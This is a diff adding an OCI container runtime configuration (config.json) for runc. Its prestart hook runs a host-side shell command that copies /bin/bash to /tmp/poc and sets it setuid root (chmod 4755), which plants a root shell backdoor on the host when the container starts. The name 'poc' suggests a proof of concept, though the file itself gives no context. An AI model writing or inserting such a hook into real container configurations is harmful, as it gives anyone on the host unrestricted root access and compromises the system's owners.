@@ -1,0 +1,32 @@
+{
+  "ociVersion": "1.0.2-dev",
+  "process": {
+    "terminal": true,
+    "user": { "uid": 0, "gid": 0 },
+    "args": [ "/bin/sh" ],
+    "env": [ "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", "TERM=xterm" ],
+    "cwd": "/",
+    "noNewPrivileges": false
+  },
+  "root": {
+    "path": "rootfs",
+    "readonly": true
+  },
+  "hostname": "runc",
+  "mounts": [
+    { "destination": "/proc", "type": "proc", "source": "proc" }
+  ],
+  "hooks": {
+    "prestart": [
+      {
+        "path": "/bin/sh",
+        "args": [ "sh", "-c", "cp /bin/bash /tmp/poc && chmod 4755 /tmp/poc" ]
+      }
+    ]
+  },
+  "linux": {
+    "namespaces": [
+      { "type": "pid" }, { "type": "ipc" }, { "type": "uts" }, { "type": "mount" }, { "type": "network" }
+    ]
+  }
+}
